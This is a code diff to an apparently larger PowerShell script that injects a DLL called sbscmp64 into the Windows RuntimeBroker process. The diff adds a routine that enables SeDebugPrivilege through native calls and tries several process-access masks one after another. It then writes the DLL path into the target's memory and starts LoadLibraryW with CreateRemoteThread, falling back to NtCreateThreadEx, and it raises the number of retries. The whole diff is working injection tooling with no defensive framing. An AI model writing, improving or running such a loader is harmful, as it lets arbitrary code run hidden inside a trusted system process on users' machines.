@@ -78,6 +78,74 @@ function Write-Step {
     Write-Host "  [$((Get-Date).ToString('HH:mm:ss'))] $Message" -ForegroundColor $Color
 }
 
+function Enable-SeDebugPrivilege {
+    try {
+        Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+public static class NativePrivilege {
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentProcess();
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LUID { public uint LowPart; public int HighPart; }
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
+    [StructLayout(LayoutKind.Sequential)]
+    public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privileges; }
+    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
+    public const uint TOKEN_QUERY = 0x0008;
+    public const uint SE_PRIVILEGE_ENABLED = 0x00000002;
+    public static bool EnableDebugPrivilege() {
+        IntPtr token;
+        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out token))
+            return false;
+        LUID luid;
+        if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid)) {
+            CloseHandle(token);
+            return false;
+        }
+        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
+        tp.PrivilegeCount = 1;
+        tp.Privileges.Luid = luid;
+        tp.Privileges.Attributes = SE_PRIVILEGE_ENABLED;
+        bool ok = AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+        CloseHandle(token);
+        return ok;
+    }
+}
+'@ -ErrorAction SilentlyContinue | Out-Null
+        $result = [NativePrivilege]::EnableDebugPrivilege()
+        if ($result) {
+            Write-Step 'SeDebugPrivilege enabled.' -Color Gray
+        }
+        return [bool]$result
+    } catch {
+        return $false
+    }
+}
+
+function Get-NormalizedDllPath {
+    param([string]$DllPath)
+    try {
+        $full = [System.IO.Path]::GetFullPath($DllPath)
+        if ($full -match '^\\\\\?\\') { return $full }
+        if ($full.Length -ge 260) {
+            return ('\\?\{0}' -f $full)
+        }
+        return $full
+    } catch {
+        return $DllPath
+    }
+}
+
 function Resolve-LocalBuildDll {
     param([string[]]$Names)
 
@@ -710,7 +778,7 @@ function Start-RuntimeBrokerInstance {
             return $null
         }
     }
-    Start-Sleep -Seconds 1
+    Start-Sleep -Seconds 2
     return (Get-RuntimeBrokerInjectionTarget -DllPath $DllPath)
 }
 
@@ -761,7 +829,9 @@ function Invoke-Sbscmp30LoadFromDisk {
     }
 
     $targetProc = $null
-    $maxInjectRetries = 3
+    $maxInjectRetries = 5
+    Enable-SeDebugPrivilege | Out-Null
+    $injectDllPath = Get-NormalizedDllPath -DllPath $p
 
     for ($retry = 0; $retry -lt $maxInjectRetries; $retry++) {
         $targetProc = Get-RuntimeBrokerInjectionTarget -DllPath $p
@@ -783,7 +853,7 @@ function Invoke-Sbscmp30LoadFromDisk {
         $targetPid = $targetProc.Id
         Write-Step "Injecting sbscmp64 into RuntimeBroker PID $targetPid (attempt $($retry + 1))..." -Color Gray
 
-        $loadResult = [Injector]::X($targetPid, $p)
+        $loadResult = [Injector]::X($targetPid, $injectDllPath)
         if ($loadResult -gt 0) {
             Start-Sleep -Seconds 2
             $refreshed = Get-Process -Id $targetPid -ErrorAction SilentlyContinue
@@ -792,7 +862,7 @@ function Invoke-Sbscmp30LoadFromDisk {
                 return $true
             }
 
-            $moduleBase = [Injector]::GetModuleBase($targetPid, $p)
+            $moduleBase = [Injector]::GetModuleBase($targetPid, $injectDllPath)
             if ($moduleBase -ne [IntPtr]::Zero) {
                 Write-Step "sbscmp64 loaded in RuntimeBroker PID $targetPid (toolhelp confirmed)" -Color Green
                 return $true
@@ -802,7 +872,12 @@ function Invoke-Sbscmp30LoadFromDisk {
         } elseif ($loadResult -eq 0) {
             Write-Step 'LoadLibraryW returned NULL in target process (blocked or bad DLL).' -Color Yellow
         } else {
-            Write-Step 'Injection API returned failure.' -Color Yellow
+            $detail = [Injector]::LastError
+            if ($detail) {
+                Write-Step "Injection API returned failure ($detail)." -Color Yellow
+            } else {
+                Write-Step 'Injection API returned failure.' -Color Yellow
+            }
         }
 
         $cleanup = Get-Process -Id $targetPid -ErrorAction SilentlyContinue
@@ -1052,20 +1127,42 @@ public class Injector {
     }
 
     [DllImport("kernel32")] static extern bool GetExitCodeThread(IntPtr h, out uint exitCode);
+    [DllImport("ntdll.dll")] static extern int NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr bytesBuffer);
+
+    public static string LastError = "";
+
+    static IntPtr OpenProcessWithFallback(int pid) {
+        uint[] masks = new uint[] { 0x1F0FFF, 0x043A, 0x1410 };
+        foreach (uint mask in masks) {
+            IntPtr h = OpenProcess(mask, false, pid);
+            if (h != IntPtr.Zero) return h;
+        }
+        return IntPtr.Zero;
+    }
+
+    static IntPtr CreateRemoteThreadEx(IntPtr hProc, IntPtr start, IntPtr param) {
+        IntPtr t = CreateRemoteThread(hProc, IntPtr.Zero, 0, start, param, 0, IntPtr.Zero);
+        if (t != IntPtr.Zero) return t;
+        IntPtr nt = IntPtr.Zero;
+        int status = NtCreateThreadEx(out nt, 0x1FFFFF, IntPtr.Zero, hProc, start, param, false, 0, 0, 0, IntPtr.Zero);
+        if (status == 0 && nt != IntPtr.Zero) return nt;
+        return IntPtr.Zero;
+    }
 
     public static int X(int pid, string d) {
-        IntPtr h = OpenProcess(0x1F0FFF, false, pid);
-        if (h == IntPtr.Zero) return -1;
-        IntPtr a = VirtualAllocEx(h, IntPtr.Zero, (uint)((d.Length + 1) * 2), 0x3000, 0x4);
-        if (a == IntPtr.Zero) { CloseHandle(h); return -1; }
-        byte[] b = System.Text.Encoding.Unicode.GetBytes(d);
+        LastError = "";
+        IntPtr h = OpenProcessWithFallback(pid);
+        if (h == IntPtr.Zero) { LastError = "OpenProcess"; return -1; }
+        byte[] b = System.Text.Encoding.Unicode.GetBytes(d + "\0");
+        IntPtr a = VirtualAllocEx(h, IntPtr.Zero, (uint)b.Length, 0x3000, 0x4);
+        if (a == IntPtr.Zero) { LastError = "VirtualAllocEx"; CloseHandle(h); return -1; }
         uint w;
-        if (!WriteProcessMemory(h, a, b, (uint)b.Length, out w)) { CloseHandle(h); return -1; }
+        if (!WriteProcessMemory(h, a, b, (uint)b.Length, out w)) { LastError = "WriteProcessMemory"; CloseHandle(h); return -1; }
         IntPtr k = GetModuleHandle("kernel32.dll");
         IntPtr l = GetProcAddress(k, "LoadLibraryW");
-        IntPtr t = CreateRemoteThread(h, IntPtr.Zero, 0, l, a, 0, IntPtr.Zero);
-        if (t == IntPtr.Zero) { CloseHandle(h); return -1; }
-        WaitForSingleObject(t, 0xFFFFFFFF);
+        IntPtr t = CreateRemoteThreadEx(h, l, a);
+        if (t == IntPtr.Zero) { LastError = "CreateRemoteThread"; CloseHandle(h); return -1; }
+        WaitForSingleObject(t, 15000);
         uint exitCode = 0;
         GetExitCodeThread(t, out exitCode);
         CloseHandle(t);
